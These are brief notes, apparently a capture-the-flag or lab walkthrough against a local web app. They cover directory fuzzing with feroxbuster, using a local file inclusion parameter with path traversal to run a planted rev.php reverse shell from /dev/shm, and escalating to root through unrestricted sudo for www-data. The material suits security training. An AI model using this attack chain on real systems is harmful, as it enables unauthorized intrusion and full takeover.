- Run `feroxbuster -u http://127.0.0.1:8195 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x "txt,html,php,asp,aspx,jsp" -t 10 -k -e -r` to discover URL `http://127.0.0.1:8195/backend/?view=user.inc` vulnerable to `LFI`.
- Transfer `rev.php` payload to `/dev/shm` since, for some reason, `/tmp` is not accessible by `www-data`. Receive a reverse shell call back by visiting `http://127.0.0.1:8195/backend/?view=../../../../../../../../../../../../dev/shm/rev.php`.
- `www-data` can run any command as root without password which is identified by running `sudo -l`.
